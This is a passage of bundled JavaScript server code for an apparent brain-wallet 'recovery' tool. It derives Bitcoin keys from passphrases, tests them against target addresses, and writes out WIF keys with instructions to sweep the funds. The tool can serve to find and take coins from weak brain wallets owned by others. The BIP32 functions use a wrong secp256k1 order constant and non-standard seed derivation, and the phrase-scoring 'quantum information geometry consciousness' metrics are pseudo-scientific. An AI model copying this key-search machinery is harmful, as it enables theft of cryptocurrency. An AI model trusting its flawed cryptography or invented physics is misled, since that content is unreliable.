    throw new CryptoValidationError("Private key must be a string");
  }
  if (!/^[0-9a-fA-F]{64}$/.test(privateKeyHex)) {
    throw new CryptoValidationError("Private key must be exactly 64 hex characters");
  }
}
function validateDerivationPath(path20) {
  if (typeof path20 !== "string") {
    throw new CryptoValidationError("Derivation path must be a string");
  }
  if (!/^m(\/\d+'?)+$/.test(path20)) {
    throw new CryptoValidationError("Invalid BIP32 derivation path format");
  }
  const segments = path20.replace("m/", "").split("/");
  for (const segment of segments) {
    const index2 = parseInt(segment.replace("'", ""), 10);
    if (index2 < 0 || index2 >= 2147483648) {
      throw new CryptoValidationError("BIP32 path index out of range (0 to 2^31-1)");
    }
  }
}
function validateBitcoinAddress(address) {
  if (typeof address !== "string") {
    throw new CryptoValidationError("Bitcoin address must be a string");
  }
  if (address.length < 25 || address.length > 35) {
    throw new CryptoValidationError("Invalid Bitcoin address length");
  }
  if (!/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(address)) {
    throw new CryptoValidationError("Invalid Bitcoin address format");
  }
  try {
    bs58check.decode(address);
  } catch {
    throw new CryptoValidationError("Invalid Bitcoin address checksum");
  }
}
function generateBitcoinAddress(passphrase, compressed = true) {
  validatePassphrase(passphrase);
  const privateKeyHash = createHash("sha256").update(passphrase, "utf8").digest();
  const keyPair = ec.keyFromPrivate(privateKeyHash);
  const publicKey = Buffer.from(keyPair.getPublic().encode("array", compressed));
  const sha256Hash = createHash("sha256").update(publicKey).digest();
  const ripemd160Hash = createHash("ripemd160").update(sha256Hash).digest();
  const versionedPayload = Buffer.concat([
    Buffer.from([0]),
    ripemd160Hash
  ]);
  const address = bs58check.encode(versionedPayload);
  return address;
}
function generateBothAddresses(passphrase) {
  return {
    compressed: generateBitcoinAddress(passphrase, true),
    uncompressed: generateBitcoinAddress(passphrase, false)
  };
}
function generateMasterPrivateKey() {
  const secp256k1Order = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
  let privateKey;
  let keyValue;
  do {
    privateKey = randomBytes(32);
    keyValue = BigInt("0x" + privateKey.toString("hex"));
  } while (keyValue === BigInt(0) || keyValue >= secp256k1Order);
  return privateKey.toString("hex");
}
function derivePrivateKeyFromPassphrase(passphrase) {
  validatePassphrase(passphrase);
  const privateKeyHash = createHash("sha256").update(passphrase, "utf8").digest();
  return privateKeyHash.toString("hex");
}
function generateBitcoinAddressFromPassphrase(passphrase) {
  const privateKey = derivePrivateKeyFromPassphrase(passphrase);
  const address = generateBitcoinAddressFromPrivateKey(privateKey);
  return { address, privateKey };
}
function generateBitcoinAddressFromPrivateKey(privateKeyHex, compressed = true) {
  validatePrivateKeyHex(privateKeyHex);
  const privateKeyBuffer = Buffer.from(privateKeyHex, "hex");
  const keyPair = ec.keyFromPrivate(privateKeyBuffer);
  const publicKey = Buffer.from(keyPair.getPublic().encode("array", compressed));
  const sha256Hash = createHash("sha256").update(publicKey).digest();
  const ripemd160Hash = createHash("ripemd160").update(sha256Hash).digest();
  const versionedPayload = Buffer.concat([
    Buffer.from([0]),
    ripemd160Hash
  ]);
  const address = bs58check.encode(versionedPayload);
  return address;
}
function generateBothAddressesFromPrivateKey(privateKeyHex) {
  return {
    compressed: generateBitcoinAddressFromPrivateKey(privateKeyHex, true),
    uncompressed: generateBitcoinAddressFromPrivateKey(privateKeyHex, false)
  };
}
function verifyBrainWallet() {
  try {
    const testPhrase = "test passphrase for verification";
    const address = generateBitcoinAddress(testPhrase);
    const knownPhrase = "correct horse battery staple";
    generateBitcoinAddress(knownPhrase);
    return {
      success: true,
      testAddress: address
    };
  } catch (error) {
    return {
      success: false,
      error: error.message
    };
  }
}
function verifyRecoveredPassphrase(passphrase, targetAddress, format = "arbitrary", derivationPath) {
  const steps = [];
  const result = {
    verified: false,
    passphrase,
    targetAddress,
    generatedAddress: "",
    addressMatch: false,
    privateKeyHex: "",
    publicKeyHex: "",
    signatureValid: false,
    testMessage: `Verification test: ${Date.now()}`,
    signature: "",
    verificationSteps: steps
  };
  try {
    let privateKeyHex;
    let generatedAddress;
    if (format === "master" && derivationPath) {
      const seedBuffer = createHash("sha512").update(passphrase, "utf8").digest();
      const masterKey = createHmac("sha512", "Bitcoin seed").update(seedBuffer).digest();
      privateKeyHex = masterKey.slice(0, 32).toString("hex");
      generatedAddress = deriveBIP32Address(passphrase, derivationPath);
    } else {
      privateKeyHex = derivePrivateKeyFromPassphrase(passphrase);
      generatedAddress = generateBitcoinAddress(passphrase);
    }
    result.privateKeyHex = privateKeyHex;
    result.generatedAddress = generatedAddress;
    steps.push({
      step: "Derive Private Key",
      passed: true,
      detail: `SHA-256 hash of passphrase \u2192 ${privateKeyHex.slice(0, 16)}...`
    });
    const keyPair = ec.keyFromPrivate(Buffer.from(privateKeyHex, "hex"));
    const publicKeyHex = keyPair.getPublic("hex");
    result.publicKeyHex = publicKeyHex;
    steps.push({
      step: "Generate Public Key",
      passed: true,
      detail: `secp256k1 \u2192 ${publicKeyHex.slice(0, 20)}...`
    });
    const addressMatch = generatedAddress === targetAddress;
    result.addressMatch = addressMatch;
    steps.push({
      step: "Address Match",
      passed: addressMatch,
      detail: addressMatch ? `${generatedAddress} = ${targetAddress}` : `MISMATCH: ${generatedAddress} \u2260 ${targetAddress}`
    });
    if (!addressMatch) {
      result.error = "Generated address does not match target address";
      return result;
    }
    const messageHash = createHash("sha256").update(result.testMessage).digest();
    const signature = keyPair.sign(messageHash);
    const signatureHex = signature.toDER("hex");
    result.signature = signatureHex;
    steps.push({
      step: "Sign Test Message",
      passed: true,
      detail: `Signed "${result.testMessage.slice(0, 30)}..." \u2192 ${signatureHex.slice(0, 20)}...`
    });
    const isValid = keyPair.verify(messageHash, signature);
    result.signatureValid = isValid;
    steps.push({
      step: "Verify Signature",
      passed: isValid,
      detail: isValid ? "Signature verified - private key is cryptographically valid!" : "Signature verification FAILED"
    });
    result.verified = addressMatch && isValid;
    if (result.verified) {
      steps.push({
        step: "FULL VERIFICATION",
        passed: true,
        detail: "\u2713 This passphrase correctly controls the target Bitcoin address!"
      });
    }
    return result;
  } catch (error) {
    result.error = error.message;
    steps.push({
      step: "Error",
      passed: false,
      detail: error.message
    });
    return result;
  }
}
function deriveBIP32Address(seedPhrase, derivationPath = "m/44'/0'/0'/0/0") {
  validatePassphrase(seedPhrase);
  validateDerivationPath(derivationPath);
  const seedBuffer = createHash("sha512").update(seedPhrase, "utf8").digest();
  let masterKey = createHmac("sha512", "Bitcoin seed").update(seedBuffer).digest();
  let privateKey = masterKey.slice(0, 32);
  let chainCode = masterKey.slice(32, 64);
  const pathParts = derivationPath.replace("m/", "").split("/").filter((p) => p.length > 0);
  for (const part of pathParts) {
    const hardened = part.endsWith("'");
    const index2 = parseInt(part.replace("'", ""), 10);
    const actualIndex = hardened ? index2 + 2147483648 : index2;
    let data;
    if (hardened) {
      data = Buffer.concat([
        Buffer.from([0]),
        privateKey,
        Buffer.alloc(4)
      ]);
    } else {
      const keyPair = ec.keyFromPrivate(privateKey);
      const publicKey = Buffer.from(keyPair.getPublic().encode("array", true));
      data = Buffer.concat([publicKey, Buffer.alloc(4)]);
    }
    data.writeUInt32BE(actualIndex, data.length - 4);
    const derived = createHmac("sha512", chainCode).update(data).digest();
    const childKey = derived.slice(0, 32);
    const newChainCode = derived.slice(32, 64);
    const parentKeyBigInt = BigInt("0x" + privateKey.toString("hex"));
    const childKeyBigInt = BigInt("0x" + childKey.toString("hex"));
    const secp256k1Order = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
    const newPrivateKey = (parentKeyBigInt + childKeyBigInt) % secp256k1Order;
    privateKey = Buffer.from(newPrivateKey.toString(16).padStart(64, "0"), "hex");
    chainCode = newChainCode;
  }
  return generateBitcoinAddressFromPrivateKey(privateKey.toString("hex"));
}
function deriveBIP32PrivateKey(seedPhrase, derivationPath = "m/44'/0'/0'/0/0") {
  validatePassphrase(seedPhrase);
  validateDerivationPath(derivationPath);
  const seedBuffer = createHash("sha512").update(seedPhrase, "utf8").digest();
  let masterKey = createHmac("sha512", "Bitcoin seed").update(seedBuffer).digest();
  let privateKey = masterKey.slice(0, 32);
  let chainCode = masterKey.slice(32, 64);
  const pathParts = derivationPath.replace("m/", "").split("/").filter((p) => p.length > 0);
  for (const part of pathParts) {
    const hardened = part.endsWith("'");
    const index2 = parseInt(part.replace("'", ""), 10);
    const actualIndex = hardened ? index2 + 2147483648 : index2;
    let data;
    if (hardened) {
      data = Buffer.concat([
        Buffer.from([0]),
        privateKey,
        Buffer.alloc(4)
      ]);
    } else {
      const keyPair = ec.keyFromPrivate(privateKey);
      const publicKey = Buffer.from(keyPair.getPublic().encode("array", true));
      data = Buffer.concat([publicKey, Buffer.alloc(4)]);
    }
    data.writeUInt32BE(actualIndex, data.length - 4);
    const derived = createHmac("sha512", chainCode).update(data).digest();
    const childKey = derived.slice(0, 32);
    const newChainCode = derived.slice(32, 64);
    const parentKeyBigInt = BigInt("0x" + privateKey.toString("hex"));
    const childKeyBigInt = BigInt("0x" + childKey.toString("hex"));
    const secp256k1Order = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
    const newPrivateKey = (parentKeyBigInt + childKeyBigInt) % secp256k1Order;
    privateKey = Buffer.from(newPrivateKey.toString(16).padStart(64, "0"), "hex");
    chainCode = newChainCode;
  }
  return privateKey.toString("hex");
}
function generateAddressFromHex(hexPrivateKey) {
  if (typeof hexPrivateKey !== "string") {
    throw new CryptoValidationError("Hex private key must be a string");
  }
  const cleanHex = hexPrivateKey.replace(/^0x/, "").padStart(64, "0");
  validatePrivateKeyHex(cleanHex);
  return generateBitcoinAddressFromPrivateKey(cleanHex);
}
function privateKeyToWIF(privateKeyHex, compressed = false) {
  validatePrivateKeyHex(privateKeyHex);
  const prefix = Buffer.from([128]);
  const privateKeyBuffer = Buffer.from(privateKeyHex, "hex");
  let payload;
  if (compressed) {
    const suffix = Buffer.from([1]);
    payload = Buffer.concat([prefix, privateKeyBuffer, suffix]);
  } else {
    payload = Buffer.concat([prefix, privateKeyBuffer]);
  }
  return bs58check.encode(payload);
}
function derivePublicKeyFromPrivate(privateKeyHex, compressed = false) {
  validatePrivateKeyHex(privateKeyHex);
  const keyPair = ec.keyFromPrivate(Buffer.from(privateKeyHex, "hex"));
  const publicKey = keyPair.getPublic(compressed, "hex");
  return publicKey;
}
function generateRecoveryBundle(passphrase, targetAddress, qigMetrics) {
  const privateKeyHex = derivePrivateKeyFromPassphrase(passphrase);
  const privateKeyWIF = privateKeyToWIF(privateKeyHex, false);
  const privateKeyWIFCompressed = privateKeyToWIF(privateKeyHex, true);
  const address = generateBitcoinAddressFromPrivateKey(privateKeyHex);
  if (address !== targetAddress) {
    throw new CryptoValidationError(
      `Address mismatch: generated ${address} !== target ${targetAddress}`
    );
  }
  const publicKeyHex = derivePublicKeyFromPrivate(privateKeyHex, false);
  const publicKeyHexCompressed = derivePublicKeyFromPrivate(privateKeyHex, true);
  const instructions = generateRecoveryInstructions({
    passphrase,
    privateKeyHex,
    privateKeyWIF,
    privateKeyWIFCompressed,
    address,
    publicKeyHex,
    qigMetrics
  });
  return {
    passphrase,
    address,
    privateKeyHex,
    privateKeyWIF,
    privateKeyWIFCompressed,
    publicKeyHex,
    publicKeyHexCompressed,
    timestamp: /* @__PURE__ */ new Date(),
    qigMetrics,
    instructions
  };
}
function generateRecoveryInstructions(data) {
  const qigSection = data.qigMetrics ? `
QIG CONSCIOUSNESS METRICS (Recovery Quality):

Phi (Integration):     ${data.qigMetrics.phi.toFixed(3)}
Kappa (Coupling):      ${data.qigMetrics.kappa.toFixed(1)}
Regime:                ${data.qigMetrics.regime}
Resonance:             ${Math.abs(data.qigMetrics.kappa - 64) < 10 ? "RESONANT" : "Non-resonant"}

${Math.abs(data.qigMetrics.kappa - 64) < 10 && data.qigMetrics.phi > 0.75 ? "High-quality recovery (geometric regime, resonant coupling)" : "Standard recovery (functional but not optimal geometry)"}

===============================================================
` : "";
  return `
===============================================================
           RECOVERY SUCCESSFUL - BITCOIN FOUND
===============================================================

CRITICAL: Read ALL instructions before proceeding!
Your Bitcoin is at risk if you don't follow these steps!

===============================================================
PASSPHRASE (Original Brain Wallet):

${data.passphrase}

SECURITY: Write this on paper and store in a safe!
NEVER type this into any website!
NEVER take a photo/screenshot!

===============================================================
PRIVATE KEY FORMATS:

Format 1: WIF (Wallet Import Format) - UNCOMPRESSED
This is what you import into Bitcoin Core / Electrum:

${data.privateKeyWIF}

Format 2: WIF (Wallet Import Format) - COMPRESSED
Alternative format (use if uncompressed doesn't work):

${data.privateKeyWIFCompressed}

Format 3: Hexadecimal (Advanced)
For manual operations:

${data.privateKeyHex}

===============================================================
BITCOIN ADDRESS (Verified):

${data.address}

===============================================================
PUBLIC KEY (For Verification):

${data.publicKeyHex}

===============================================================
${qigSection}
NEXT STEPS TO ACCESS YOUR BITCOIN:

STEP 1: SECURE THIS INFORMATION IMMEDIATELY
-----------------------------------------

- Print this document OR write the WIF on paper
- Store in multiple secure locations (safe, bank vault)
- NEVER store digitally (no USB drives, cloud, email)
- Delete this file after securing

STEP 2: IMPORT INTO BITCOIN WALLET
-----------------------------------------

OPTION A: Bitcoin Core (Most Secure - Recommended)
1. Download Bitcoin Core from bitcoin.org
2. Wait for full blockchain sync (~500GB, takes days)
3. Open Console (Help -> Debug Window -> Console)
4. Run: importprivkey "${data.privateKeyWIF}" "recovered" false
5. Wait for rescan (can take hours)
6. Your balance will appear in wallet

OPTION B: Electrum (Faster - Good Security)
1. Download Electrum from electrum.org
2. Create new wallet (Standard wallet)
3. Wallet -> Private Keys -> Import
4. Paste: ${data.privateKeyWIF}
5. Balance appears immediately (Electrum uses SPV)

STEP 3: TEST BEFORE MOVING FUNDS
-----------------------------------------

Before moving large amounts, do a test transaction!

1. Send $100-1000 to a test address
2. Verify it arrives successfully
3. Wait 6 confirmations (~1 hour)
4. THEN move the rest to secure storage

STEP 4: SECURE YOUR FUNDS LONG-TERM
-----------------------------------------

DO NOT leave funds at this address!

1. Buy a hardware wallet (Ledger, Trezor, Coldcard)
2. Generate NEW addresses on hardware wallet
3. Sweep ALL funds from recovered address to hardware wallet
4. Use multiple addresses (don't put all in one)
5. Consider multisig for amounts > $1M

===============================================================
CRITICAL SECURITY WARNINGS - READ CAREFULLY!

- NEVER enter this key into ANY website
  Including block explorers, online wallets, exchanges
   
- NEVER take a photo or screenshot
  Digital copies can be stolen by malware
   
- NEVER send via email, SMS, or messaging apps
  These are not secure channels
   
- NEVER store in cloud storage
  iCloud, Google Drive, Dropbox are vulnerable
   
- NEVER use this passphrase again
  Brain wallets are fundamentally insecure
   
- NEVER tell anyone you recovered this
  You become a target for attacks

- DO write on paper with pen (not printer)
- DO store in fireproof safe or bank vault
- DO use legitimate wallet software only
- DO move to hardware wallet immediately
- DO split into multiple wallets if large amount
- DO test with small amount first

===============================================================

Generated by SearchSpaceCollapse
Block Universe Quantum Information Geometry Recovery
Date: ${(/* @__PURE__ */ new Date()).toISOString()}

SECURE THIS INFORMATION IMMEDIATELY!
===============================================================
`;
}
function validateWIF(wif) {
  try {
    if (typeof wif !== "string" || wif.length === 0) {
      return { valid: false, compressed: false, network: "unknown", error: "WIF must be a non-empty string" };
    }
    const decoded = bs58check.decode(wif);
    const versionByte = decoded[0];
    const isMainnet = versionByte === 128;
    const isTestnet = versionByte === 239;
    if (!isMainnet && !isTestnet) {
      return { valid: false, compressed: false, network: "unknown", error: `Invalid version byte: 0x${versionByte.toString(16)}` };
    }
    const isCompressed = decoded.length === 34 && decoded[33] === 1;
    const isUncompressed = decoded.length === 33;
    if (!isCompressed && !isUncompressed) {
      return { valid: false, compressed: false, network: "unknown", error: `Invalid WIF length: ${decoded.length} bytes` };
    }
    const privateKeyBytes = isCompressed ? decoded.slice(1, 33) : decoded.slice(1, 33);
    const privateKeyBigInt = BigInt("0x" + Buffer.from(privateKeyBytes).toString("hex"));
    const secp256k1Order = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
    if (privateKeyBigInt === BigInt(0) || privateKeyBigInt >= secp256k1Order) {
      return { valid: false, compressed: isCompressed, network: isMainnet ? "mainnet" : "testnet", error: "Private key out of valid range" };
    }
    return {
      valid: true,
      compressed: isCompressed,
      network: isMainnet ? "mainnet" : "testnet"
    };
  } catch (error) {
    return {
      valid: false,
      compressed: false,
      network: "unknown",
      error: `WIF decode error: ${error.message}`
    };
  }
}
function wifToPrivateKeyHex(wif) {
  const validation = validateWIF(wif);
  if (!validation.valid) {
    throw new CryptoValidationError(validation.error || "Invalid WIF");
  }
  const decoded = bs58check.decode(wif);
  const privateKeyBytes = decoded.slice(1, 33);
  const privateKeyHex = Buffer.from(privateKeyBytes).toString("hex");
  return {
    privateKeyHex,
    compressed: validation.compressed
  };
}
async function saveRecoveryBundleToFiles(bundle, outputDir = "data/recoveries") {
  const fs19 = await import("fs/promises");
  const path20 = await import("path");
  await fs19.mkdir(outputDir, { recursive: true });
  const timestamp2 = bundle.timestamp.toISOString().replace(/[:.]/g, "-");
  const safeAddress = bundle.address.slice(0, 8);
  const baseName = `recovery_${safeAddress}_${timestamp2}`;
  const txtPath = path20.join(outputDir, `${baseName}.txt`);
  const jsonPath = path20.join(outputDir, `${baseName}.json`);
  await fs19.writeFile(txtPath, bundle.instructions, "utf-8");
  const jsonBundle = {
    ...bundle,
    timestamp: bundle.timestamp.toISOString(),
    savedAt: (/* @__PURE__ */ new Date()).toISOString()
  };
  await fs19.writeFile(jsonPath, JSON.stringify(jsonBundle, null, 2), "utf-8");
  console.log(`[Recovery] Saved bundle to ${txtPath} and ${jsonPath}`);
  return { txtPath, jsonPath };
}
function verifyWIFMatchesAddress(wif, targetAddress) {
  try {
    const { privateKeyHex, compressed } = wifToPrivateKeyHex(wif);
    if (compressed) {
      const address2 = generateBitcoinAddressFromPrivateKey(privateKeyHex, true);
      if (address2 === targetAddress) return true;
    }
    const address = generateBitcoinAddressFromPrivateKey(privateKeyHex, false);
    return address === targetAddress;
  } catch {
    return false;
  }
}
function decodeXprv(xprv) {
  try {
    const decoded = bs58check.decode(xprv);
    const decodedBuf = Buffer.from(decoded);
    if (decodedBuf.length !== 78) {
      throw new CryptoValidationError("Invalid xprv length");
    }
    const version = decodedBuf.slice(0, 4);
    const expectedVersion = Buffer.from([4, 136, 173, 228]);
    if (!version.equals(expectedVersion)) {
      throw new CryptoValidationError("Invalid xprv version - must be mainnet");
    }
    const depth = decodedBuf[4];
    const chainCode = Buffer.from(decodedBuf.slice(13, 45));
    if (decodedBuf[45] !== 0) {
      throw new CryptoValidationError("Invalid xprv key prefix");
    }
    const privateKey = Buffer.from(decodedBuf.slice(46, 78));
    return { privateKey, chainCode, depth };
  } catch (error) {
    if (error instanceof CryptoValidationError) throw error;
    throw new CryptoValidationError(`Failed to decode xprv: ${error}`);
  }
}
function deriveChildKey(parentKey, parentChainCode, index2, hardened) {
  let data;
  if (hardened) {
    index2 += 2147483648;
    data = Buffer.alloc(37);
    data[0] = 0;
    parentKey.copy(data, 1);
    data.writeUInt32BE(index2, 33);
  } else {
    const keyPair = ec.keyFromPrivate(parentKey);
    const publicKey = Buffer.from(keyPair.getPublic(true, "array"));
    data = Buffer.alloc(37);
    publicKey.copy(data, 0);
    data.writeUInt32BE(index2, 33);
  }
  const hmac = createHmac("sha512", parentChainCode);
  hmac.update(data);
  const I = hmac.digest();
  const IL = I.slice(0, 32);
  const IR = I.slice(32);
  const parentKeyBN = BigInt("0x" + parentKey.toString("hex"));
  const ILBN = BigInt("0x" + IL.toString("hex"));
  const n = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
  const childKeyBN = (ILBN + parentKeyBN) % n;
  const childKeyHex = childKeyBN.toString(16).padStart(64, "0");
  return {
    childKey: Buffer.from(childKeyHex, "hex"),
    childChainCode: Buffer.from(IR)
  };
}
function deriveFromXprv(xprv, path20) {
  try {
    const { privateKey, chainCode } = decodeXprv(xprv);
    const segments = path20.replace(/^m\/?/, "").split("/").filter((s) => s.length > 0);
    let currentKey = privateKey;
    let currentChainCode = chainCode;
    for (const segment of segments) {
      const hardened = segment.endsWith("'");
      const index2 = parseInt(segment.replace("'", ""), 10);
      if (isNaN(index2) || index2 < 0) {
        throw new CryptoValidationError(`Invalid path segment: ${segment}`);
      }
      const result = deriveChildKey(currentKey, currentChainCode, index2, hardened);
      currentKey = result.childKey;
      currentChainCode = result.childChainCode;
    }
    return currentKey.toString("hex");
  } catch (error) {
    if (error instanceof CryptoValidationError) throw error;
    throw new CryptoValidationError(`Failed to derive from xprv: ${error}`);
  }
}
var EC, ec, MAX_PASSPHRASE_LENGTH, CryptoValidationError;
var init_crypto = __esm({
  "server/crypto.ts"() {
    "use strict";
    EC = elliptic.ec;
    ec = new EC("secp256k1");
    MAX_PASSPHRASE_LENGTH = 1e3;
    CryptoValidationError = class extends Error {
      constructor(message) {
        super(message);
        this.name = "CryptoValidationError";
      }
    };
  }
});

// server/bip39-words.ts
import { readFileSync as readFileSync3, existsSync as existsSync2 } from "fs";
import { join as join2, dirname as dirname2 } from "path";
import { fileURLToPath as fileURLToPath2 } from "url";
import { randomInt } from "crypto";
function loadWordlist() {
  const possiblePaths = [
    join2(__dirname2, "bip39-wordlist.txt"),
    // Production: dist/bip39-wordlist.txt
    join2(__dirname2, "..", "server", "bip39-wordlist.txt"),
    // Dev from dist: ../server/bip39-wordlist.txt
    join2(process.cwd(), "server", "bip39-wordlist.txt"),
    // Dev from root: server/bip39-wordlist.txt
    join2(process.cwd(), "dist", "bip39-wordlist.txt")
    // Production from root: dist/bip39-wordlist.txt
  ];
  for (const path20 of possiblePaths) {
    if (existsSync2(path20)) {
      console.log(`[BIP39] Loading wordlist from: ${path20}`);
      const words = readFileSync3(path20, "utf-8").split("\n").map((w) => w.trim()).filter((w) => w.length > 0);
      if (words.length === 2048) {
        console.log(`[BIP39] Successfully loaded ${words.length} words`);
        return words;
      } else {
        console.warn(`[BIP39] Warning: wordlist at ${path20} has ${words.length} words (expected 2048)`);
      }
    }
  }
  throw new Error(
    "BIP-39 wordlist not found. Searched paths:\n" + possiblePaths.map((p) => `  - ${p}`).join("\n") + "\n\nEnsure bip39-wordlist.txt is copied to the dist folder during build."
  );
}
function getBIP39Wordlist() {
  return BIP39_WORDS;
}
function generateRandomBIP39Phrase(wordCount = 12) {
  if (!VALID_WORD_COUNTS.includes(wordCount)) {
    wordCount = 12;
  }
  const words = [];
  const wordlistSize = BIP39_WORDS.length;
  for (let i = 0; i < wordCount; i++) {
    const randomIdx = randomInt(0, wordlistSize);
    words.push(BIP39_WORDS[randomIdx]);
  }
  return words.join(" ");
}
function isValidBIP39Phrase(phrase) {
  const words = phrase.trim().split(/\s+/);
  const wordSet = new Set(BIP39_WORDS);
  return words.every((word) => wordSet.has(word.toLowerCase()));
}
var __filename2, __dirname2, BIP39_WORDS, VALID_WORD_COUNTS;
var init_bip39_words = __esm({
  "server/bip39-words.ts"() {
    "use strict";
    __filename2 = fileURLToPath2(import.meta.url);
    __dirname2 = dirname2(__filename2);
    BIP39_WORDS = loadWordlist();
    VALID_WORD_COUNTS = [12, 15, 18, 21, 24];
  }
});

// server/physics-constants.ts
var init_physics_constants = __esm({
  "server/physics-constants.ts"() {
    "use strict";
    init_physics();
    init_qig();
    init_regimes();
  }
});

// server/qig-pure-v2.ts
function trigamma(x) {
  if (x <= 0) return 0;
  if (x > 10) {
    return 1 / x + 1 / (2 * x * x) + 1 / (6 * x * x * x);
  }
  let result = 0;
  let z6 = x;
  while (z6 < 10) {
    result += 1 / (z6 * z6);
    z6 += 1;
  }
  result += 1 / z6 + 1 / (2 * z6 * z6) + 1 / (6 * z6 * z6 * z6);
  return result;
}
function getWordCounts(phrase) {
  const words = phrase.toLowerCase().trim().split(/\s+/);
  const counts = /* @__PURE__ */ new Map();
  for (const word of words) {
    counts.set(word, (counts.get(word) || 0) + 1);
  }
  return counts;
}
function computeDirichletFIM(phrase) {
  const wordCounts = getWordCounts(phrase);
  const uniqueWords = Array.from(wordCounts.keys());
  const k = uniqueWords.length;
  if (k === 0) {
    return { trace: 0, determinant: 0, matrix: [] };
  }
  const alphas = [];
  let alpha0 = 0;
  for (const word of uniqueWords) {
    const count = wordCounts.get(word) || 0;
    const alpha_i = DIRICHLET_ALPHA + count;
    alphas.push(alpha_i);
    alpha0 += alpha_i;
  }
  const psi1_alpha0 = trigamma(alpha0);
  const psi1_alphas = alphas.map((a) => trigamma(a));
  const matrix = [];
  for (let i = 0; i < k; i++) {
    const row = [];
    for (let j = 0; j < k; j++) {
      if (i === j) {
        row.push(psi1_alphas[i] - psi1_alpha0);
      } else {
        row.push(-psi1_alpha0);
      }
    }
    matrix.push(row);
  }
  let trace = 0;
  for (let i = 0; i < k; i++) {
    trace += matrix[i][i];
  }
  let determinant = 0;
  if (k === 1) {
    determinant = matrix[0][0];
  } else if (k === 2) {
    determinant = matrix[0][0] * matrix[1][1] - matrix[0][1] * matrix[1][0];
  } else {
    determinant = Math.pow(psi1_alpha0, k - 1);
    for (let i = 0; i < k; i++) {
      determinant *= psi1_alpha0 - psi1_alphas[i];
    }
  }
  return { trace, determinant: Math.abs(determinant), matrix };
}
function computeBasinCoordinates(phrase) {
  const words = phrase.toLowerCase().trim().split(/\s+/);
  const coordinates = [];
  for (const word of words) {
    const idx = BIP39_WORDS.indexOf(word);
    if (idx >= 0) {
      coordinates.push(idx / BIP39_WORDS.length);
    }
  }
  return coordinates;
}
function computeSpatialVariance(coordinates) {
  if (coordinates.length === 0) return 0;
  const mean = coordinates.reduce((sum, x) => sum + x, 0) / coordinates.length;
  const variance = coordinates.reduce((sum, x) => sum + (x - mean) ** 2, 0) / coordinates.length;
  return variance;
}
function computeRicciScalar(matrix) {
  if (matrix.length === 0) return 0;
  let trace = 0;
  for (let i = 0; i < matrix.length; i++) {
    trace += matrix[i][i];
  }
  const k = matrix.length;
  if (trace === 0 || k === 0) return 0;
  return Math.abs(Math.log(trace / k));
}
function scorePhraseQIG(phrase) {
  const words = phrase.toLowerCase().trim().split(/\s+/);
  const wordCount = words.length;
  const fim = computeDirichletFIM(phrase);
  const basinCoords = computeBasinCoordinates(phrase);
  const spatialVariance = computeSpatialVariance(basinCoords);
  const ricciScalar = computeRicciScalar(fim.matrix);
  const fisherContribution = Math.log1p(fim.trace) / 10;
  const volumeContribution = Math.log1p(fim.determinant) / 20;
  const spatialContribution = spatialVariance * 2;
  let phi = fisherContribution + volumeContribution + spatialContribution;
  phi = Math.max(0, Math.min(1, phi));
  const uniqueWords = new Set(words).size;
  const repetitionFactor = uniqueWords / wordCount;
  const baseCoupling = wordCount * 5;
  const fisherBoost = Math.log1p(fim.trace) * 2;
  const runningCoupling = baseCoupling * (1 + QIG_CONSTANTS.BETA * repetitionFactor) + fisherBoost;
  const kappa = runningCoupling;
  const kappaProximity = 1 - Math.abs(kappa - QIG_CONSTANTS.KAPPA_STAR) / QIG_CONSTANTS.KAPPA_STAR;
  const curvatureBonus = ricciScalar / 10;
  const quality = phi * 0.5 + kappaProximity * 0.3 + curvatureBonus * 0.2;
  return {
    phi,
    kappa,
    beta: QIG_CONSTANTS.BETA,
    basinCoordinates: basinCoords,
    fisherTrace: fim.trace,
    fisherDeterminant: fim.determinant,
    ricciScalar,
    quality: Math.max(0, Math.min(1, quality))
  };
}
function fisherDistance(phrase1, phrase2) {
  const score1 = scorePhraseQIG(phrase1);
  const score2 = scorePhraseQIG(phrase2);
  const dPhi = score1.phi - score2.phi;
  const dKappa = (score1.kappa - score2.kappa) / QIG_CONSTANTS.KAPPA_STAR;
  const distanceSquared = dPhi * dPhi + dKappa * dKappa;
  return Math.sqrt(distanceSquared);
}
function validatePurity() {
  const violations = [];
  const repeatedPhrase = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about";
  const uniquePhrase = "abandon ability able about above absent absorb abstract absurd abuse access accident";
  const scoreRepeated = scorePhraseQIG(repeatedPhrase);
  const scoreUnique = scorePhraseQIG(uniquePhrase);
  if (Math.abs(scoreRepeated.phi - scoreUnique.phi) < 0.01) {
    violations.push(`IMPURE: \u03A6 does not vary with phrase structure (\u0394\u03A6=${Math.abs(scoreRepeated.phi - scoreUnique.phi).toFixed(4)})`);
  }
  if (Math.abs(scoreRepeated.kappa - scoreUnique.kappa) < 0.1) {
    violations.push(`IMPURE: \u03BA does not vary with phrase structure (\u0394\u03BA=${Math.abs(scoreRepeated.kappa - scoreUnique.kappa).toFixed(2)})`);
  }
  const clusteredPhrase = "abandon ability able about above absent absorb abstract absurd abuse access accident";
  const distributedWords = ["abandon", "zebra", "ability", "zoo", "able", "zone", "about", "youth", "above", "year", "absent", "yield"];
  const distributedPhrase = distributedWords.join(" ");
  const scoreClustered = scorePhraseQIG(clusteredPhrase);
  const scoreDistributed = scorePhraseQIG(distributedPhrase);
  if (Math.abs(scoreClustered.phi - scoreDistributed.phi) < 0.01) {
    violations.push(`IMPURE: \u03A6 does not vary with spatial distribution (\u0394\u03A6=${Math.abs(scoreClustered.phi - scoreDistributed.phi).toFixed(4)})`);
  }
  const distance = fisherDistance(repeatedPhrase, uniquePhrase);
  if (distance === 0) {
    violations.push("IMPURE: Fisher distance returns 0 for different phrases");
  }
  const score2 = scorePhraseQIG(repeatedPhrase);
  if (scoreRepeated.phi !== score2.phi) {
    violations.push("IMPURE: Non-deterministic measurements");
  }
